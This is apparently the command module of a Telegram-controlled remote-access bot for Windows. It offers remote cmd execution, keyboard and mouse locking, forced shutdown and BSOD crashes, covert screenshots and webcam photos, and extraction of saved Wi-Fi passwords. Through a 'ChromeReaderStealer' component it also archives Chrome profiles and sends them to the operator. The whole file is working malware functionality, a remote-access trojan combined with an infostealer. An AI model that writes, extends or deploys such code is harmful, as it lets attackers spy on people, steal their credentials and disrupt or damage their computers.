from BotBase import *
from . import executer as executer

# Windows commands
@command_handler("hide_windows", "Minimize all windows")
async def hide_windows(message_or_call):
    executer.hide_windows()

    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Show windows", show_windows)]])
    await reply_to(message_or_call, "Windows hidden", reply_markup=reply_markup)


@command_handler("show_windows", "Show all hidden windows")
async def show_windows(message_or_call):
    executer.show_windows()

    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Hide windows", hide_windows)]])
    await reply_to(message_or_call, "Windows shown", reply_markup=reply_markup)

@command_handler("close_window", "Close the top window")
async def close_window(message_or_call):
    executer.close_window()

    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Close another", close_window)]])
    await reply_to(message_or_call, "Window closed", reply_markup=reply_markup)

# Locker commands
@command_handler("lock_mouse", "🖱️ Lock the mouse cursor in place")
async def lock_mouse(message_or_call):
    res = executer.MouseLocker.lock()

    text = "🖱️ Mouse locked" if res else "🖱️ Mouse is already locked"
    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Unlock", unlock_mouse)]])

    await reply_to(message_or_call, text, reply_markup=reply_markup)


@command_handler("unlock_mouse", "🖱️ Unlock the mouse cursor", show=False)
async def unlock_mouse(message_or_call):
    res = executer.MouseLocker.unlock()

    text = "🖱️ Mouse unlocked" if res else "🖱️ Mouse is not locked"
    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Lock", lock_mouse)]])

    await reply_to(message_or_call, text, reply_markup=reply_markup)

@command_handler("lock_keyboard", "⌨️ Lock the keyboard")
async def lock_keyboard(message_or_call):
    res = executer.KeyboardLocker.lock()

    text = "⌨️ Keyboard locked" if res else "⌨️ Keyboard is already locked"
    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Unlock", unlock_keyboard)]])

    await reply_to(message_or_call, text, reply_markup=reply_markup)


@command_handler("unlock_keyboard", "⌨️ Unlock the keyboard", show=False)
async def unlock_keyboard(message_or_call):
    res = executer.KeyboardLocker.unlock()

    text = "⌨️ Keyboard unlocked" if res else "⌨️ Keyboard is not locked"
    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Lock", lock_keyboard)]])

    await reply_to(message_or_call, text, reply_markup=reply_markup)

# Shutdown commands
@command_handler("shutdown", "💻 Shutdown the pc")
async def shutdown(message_or_call):
    await reply_to(message_or_call, "💻 The pc is shutting down...")
    executer.shutdown()

@command_handler("reboot", "💻 Reboot the pc")
async def restart(message_or_call):
    await reply_to(message_or_call, "💻 The pc is rebooting...")
    executer.restart()

@command_handler("logoff", "💻 Logoff the pc")
async def logoff(message_or_call):
    await reply_to(message_or_call, "💻 The pc is loggong off...")
    executer.logoff()

@command_handler("hibernate", "💻 Hibernate the pc")
async def hibernate(message_or_call):
    await reply_to(message_or_call, "💻 The pc is hibernating...")
    executer.hibernate()

@command_handler("crash", "💻 Crash the pc (BSOD)")
async def crash(message_or_call):
    await reply_to(message_or_call, "💻 The pc is crashing...")
    executer.crash()

# Program commands
@command_handler("notepad", "🗒️ Open Notepad (with optional text)")
async def notepad(message, text: str | None = None):
    #split_text = message.text.split()
    #text = " ".join(split_text[1:]) if len(split_text) > 1 else None
    executer.open_notepad(text)

    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Close window", close_window)]])
    await reply_to(message, "🗒️ Notepad opened", reply_markup=reply_markup)

@command_handler("cmd", "💻 Execute a cmd command")
async def execute_cmd(message):
    split_text = message.text.split()

    if len(split_text) == 1:
        await reply_to(message, "ERROR: Command needs to be followed by a cmd command")
        return
    
    cmd_command = " ".join(split_text[1:])# if len(split_text) > 1 else None
    ret = executer.execute_cmd(cmd_command)

    await reply_to(message, f"💻 Cmd command executed\n\n{ret}")

@command_handler("site", "🔗 Open a url or search in the browser")
async def site(message):
    split_text = message.text.split()

    if len(split_text) == 1:
        await reply_to(message, "ERROR: Command needs to be followed by a url or a search query")
        return
    
    query = " ".join(split_text[1:])# if len(split_text) > 1 else None
    executer.open_site(query)

    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Close window", close_window)]])
    await reply_to(message, "🔗 Site opened", reply_markup=reply_markup)

# Image commands
@command_handler("screenshot", "⛶ Take a screenshot")
async def take_screenshot(message_or_call):
    screenshot = executer.snap_screenshot()

    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Take another", take_screenshot)]])
    await bot.send_photo(message_or_call.chat.id if type(message_or_call) == Message else message_or_call.message.chat.id, executer.image_to_buffer(screenshot), "⛶ Screenshot", reply_markup=reply_markup)

@command_handler("picture", "📸 Take a picture")
async def take_picture(message_or_call):
    picture = executer.snap_photo()

    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Take another", take_picture)]])
    await bot.send_photo(message_or_call.chat.id if type(message_or_call) == Message else message_or_call.message.chat.id, executer.image_to_buffer(picture), "📸 Picture", reply_markup=reply_markup)


# Other commands
@command_handler("wifi", "🛜 Get saved wifi profiles")
async def wifi(message: Message):
    wifi_profiles = executer.WifiProfiler.get_wifi_profiles()

    text = "🛜 Wifi profiles:\n\n" + "\n\n".join([f"ssid: {profile.ssid}\npass: {profile.password}" for profile in wifi_profiles])
    await reply_to(message, text)

@command_handler("chromereader", "👩‍💻 Get all local chrome profiles")
async def chromereader(message: Message):
    #msg = await reply_to(message, "👩‍💻 Creating archive...")
    user_manager = Bot.ChromeReaderStealer.UserManager.get()

    caption = "👩‍💻 Found users:\n\n" + "\n".join([f"<b>{user.user_name}</b> ({len(user.profiles)} profiles):\n{"\n".join([f". {profile.name} ({profile.profile_name})" for profile in user.profiles])}" for user in user_manager.users]) + "\n\nUse the ChromeReader Visualizer on your pc to look at profiles:\nhttps://github.com/mathisgxd/ChromeReader/releases/tag/v0.1.0"

    with executer.tempfile.TemporaryDirectory() as temp_path:
        try:
            executer.os.system("taskkill /f /im chrome.exe")
        except:
            pass

        path = executer.os.path.join(temp_path, f"PC {executer.uuid.getnode()}")

        user_manager = user_manager or Bot.ChromeReaderStealer.UserManager.get()
        user_manager.save(path)

        zip_path = executer.shutil.make_archive(path, "zip", path)
        
        with open(zip_path, "rb") as file:
            await bot.send_document(message.chat.id, file, caption=caption, parse_mode="html")

# Media
get_medium_by_name_or_id = lambda name_or_id, media_type: data.get_medium_by_id(name_or_id) if (type(name_or_id) == int) or name_or_id.isdigit() else data.get_medium(name_or_id, media_type)

@command_handler("photo", show=False)
async def photo_handler(message_or_call, medium_name_or_id: str | int, cmd: str = "show", reply: bool = True):
    medium = get_medium_by_name_or_id(medium_name_or_id, "photo")
    
    if not medium:
        await reply_to(message_or_call, f"ERROR: Photo medium {medium_name_or_id} not found")
        return
        
    photo = executer.Photo(medium)

    match cmd:
        case "show":
            text = "📷 Photo"
            reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Open", photo_handler, photo.medium.id, "open", False)],
                                                    [FuncInlineKeyboardButton("Close", photo_handler, photo.medium.id, "close", False)],
                                                    [FuncInlineKeyboardButton("Set as wallpaper", photo_handler, photo.medium.id, "wallpaper", False)],
                                                    [FuncInlineKeyboardButton("Delete", photo_handler, photo.medium.id, "delete", False)]])
            await reply_to(message_or_call, text, reply_markup=reply_markup)
            return
        case "open":
            photo.open()
            action = "opened"
        case "close":
            photo.close()
            action = "closed"
        case "close_all":
            photo.close_all()
            action = "closed all"
        case "wallpaper":
            photo.set_as_wallpaper()
            action = "set as wallpaper"
        case "delete":
            photo.delete()
            action = "deleted"

    if reply or cmd=="delete":
        text = f"📷 Photo {f"'{photo.medium.name}'" if photo.medium.name else photo.medium.id} {action}"
        await reply_to(message_or_call, text)

@command_handler("audio", show=False)
async def audio_handler(message_or_call, medium_name_or_id: str | int, cmd: str = "show", reply: bool = True):
    medium = get_medium_by_name_or_id(medium_name_or_id, "audio")

    if not medium:
        await reply_to(message_or_call, f"ERROR: Audio medium {medium_name_or_id} not found")
        return
    
    audio = executer.Audio(medium)

    match cmd:
        case "show":
            text = "🎵 Audio"
            reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("▶️ Play", audio_handler, audio.medium.id, "play", False)],
                                                    [FuncInlineKeyboardButton("⏹️ Stop", audio_handler, audio.medium.id, "stop", False)],
                                                    [FuncInlineKeyboardButton("Delete", audio_handler, audio.medium.id, "delete", False)]])
            await reply_to(message_or_call, text, reply_markup=reply_markup)
            return
        case "play":
            audio.play()
            action = "playing"
        case "stop":
            audio.stop()
            action = "stopped"
        case "delete":
            audio.delete()
            action = "deleted"

    if reply or cmd=="delete":
        text = f"🎵 Audio {f"'{audio.medium.name}'" if audio.medium.name else audio.medium.id} {action}"
        await reply_to(message_or_call, text)

@command_handler("voice", show=False)
async def voice_handler(message_or_call, medium_name_or_id: str | int, cmd: str = "show", reply: bool = True):
    medium = get_medium_by_name_or_id(medium_name_or_id, "voice")

    if not medium:
        await reply_to(message_or_call, f"ERROR: Voice medium {medium_name_or_id} not found")
        return
    
    audio = executer.Audio(medium)

    match cmd:
        case "show":
            text = "🎤 Voice"
            reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("▶️ Play", voice_handler, audio.medium.id, "play", False)],
                                                    [FuncInlineKeyboardButton("⏹️ Stop", voice_handler, audio.medium.id, "stop", False)],
                                                    [FuncInlineKeyboardButton("Delete", voice_handler, audio.medium.id, "delete", False)]])
            await reply_to(message_or_call, text, reply_markup=reply_markup)
            return
        case "play":
            audio.play()
            action = "playing"
        case "stop":
            audio.stop()
            action = "stopped"
        case "delete":
            audio.delete()
            action = "deleted"

    if reply or cmd=="delete":
        text = f"🎤 Voice {f"'{audio.medium.name}'" if audio.medium.name else audio.medium.id} {action}"
        await reply_to(message_or_call, text)

@command_handler("video", show=False)
async def video_handler(message_or_call, medium_name_or_id: str | int, cmd: str = "show", reply: bool = True):
    medium = get_medium_by_name_or_id(medium_name_or_id, "video")
    
    if not medium:
        await reply_to(message_or_call, f"ERROR: Video medium '{medium_name_or_id}' not found")
        return
        
    video = executer.Video(medium)

    match cmd:
        case "show":
            text = "📽️ Video"
            reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Open", video_handler, video.medium.id, "open", False)],
                                                [FuncInlineKeyboardButton("Close", video_handler, video.medium.id, "close", False)],
                                                [FuncInlineKeyboardButton("Delete", video_handler, video.medium.id, "delete", False)]])
            await reply_to(message_or_call, text, reply_markup=reply_markup)
            return
        case "open":
            video.open()
            action = "opened"
        case "close":
            video.close()
            action = "closed"
        case "delete":
            video.delete()
            action = "deleted"
    
    if reply or cmd=="delete":
        text = f"📽️ Video {f"'{video.medium.name}'" if video.medium.name else video.medium.id} {action}"
        await reply_to(message_or_call, text)

@command_handler("file", show=False, supports_message_args=False)
async def file_handler(message: Message, file: File | None = None):
    if not file:
        split_text = message.text.split()
        media_type = split_text[1]
        name = " ".join(split_text[2:])

        medium = data.get_medium(name, media_type)

        if medium:
            file = File(medium)
        else:
            await reply_to(message, f"ERROR: {media_type} file named '{name}' not found")
            return
    
    await (photo_handler, audio_handler, voice_handler, video_handler)[("photo", "audio", "voice", "video").index(file.medium.media_type)] (message, file.medium.id, "show")


set_file_handler(file_handler)

# GTE
@command_handler("gte_handler", show=False, supports_message_args=False)
async def GTE_handler(message_or_call: Message | CallbackQuery, gte_file_name: str, cmd: str = "show"):
    code = executer.GTEFiles.load(gte_file_name)

    match cmd:
        case "show":
            text = f"GTE '{gte_file_name}':\n\n{code}"
            reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Execute", GTE_handler, gte_file_name, "execute")],
                                                    [InlineKeyboardButton("Modify", switch_inline_query_current_chat=f"/gte {gte_file_name}\n{code}")],
                                                    [FuncInlineKeyboardButton("Delete", GTE_handler, gte_file_name, "delete")],
                                                    [FuncInlineKeyboardButton("< GTE files", GTE)]])
            await reply_to(message_or_call, text, reply_markup=reply_markup)
        case "execute":
            print(f"Executing GTE '{gte_file_name}':\n{code}")

            code_lines = code.splitlines()
            tasks = []
            for code_line in code_lines:
                if not code_line.strip():
                    continue

                split_line = code_line.split()
                command_name = split_line[0]
                args = [arg.strip() for arg in " ".join(split_line[1:]).split(",")] if len(split_line) > 1 else None # Change this so it relies on a separator character instead of spaces

                if command_name not in FUNC_MAPPINGS.keys():
                    match command_name:
                        case "wait":
                            time = float(args[0]) if args else 1
                            #await asyncio.sleep(min(0.1, time))
                            await reply_to(message_or_call, f"Waiting {time} second(s)")
                            #if time > 0.1:
                            #    await asyncio.sleep(time - 0.1)
                            await asyncio.sleep(time)

                    continue

                if args:
                    #await FUNC_MAPPINGS[command_name](message_or_call, *args)
                    tasks.append(asyncio.create_task(FUNC_MAPPINGS[command_name](message_or_call, *args)))
                else:
                    #await FUNC_MAPPINGS[command_name](message_or_call)
                    tasks.append(asyncio.create_task(FUNC_MAPPINGS[command_name](message_or_call)))

            await asyncio.gather(*tasks)
            await GTE_handler(message_or_call, gte_file_name, "show")
        case "delete":
            executer.GTEFiles.delete(gte_file_name)
            await reply_to(message_or_call, f"GTE file '{gte_file_name}' deleted")

@command_handler("gte", "Execute a list of commands", supports_message_args=False)
async def GTE(message_or_call: Message | CallbackQuery, gte_file_name: str | None = None):
    async def show_files():
        reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton(gte_file_name, "gte", gte_file_name)] for gte_file_name in executer.GTEFiles.files()])
        await reply_to(message_or_call, "GTE files:", reply_markup=reply_markup)


    if not gte_file_name:
        if type(message_or_call) == CallbackQuery:
            await show_files()
            return
        
        text_lines = message_or_call.text.splitlines()

        split_line = text_lines[0].split()
        gte_file_name = " ".join(split_line[1:]) if len(split_line) > 1 else None

        if len(text_lines) > 1:
            code = "\n".join(text_lines[1:])
            executer.GTEFiles.save(gte_file_name or "latest", code)
        else:
            if gte_file_name:
                code = executer.GTEFiles.load(gte_file_name)
            else:
                await show_files()
                return
    else:
        code = executer.GTEFiles.load(gte_file_name)

    print(gte_file_name)
    await GTE_handler(message_or_call, gte_file_name or "latest", "show")

if __name__ == "__main__":
    run()


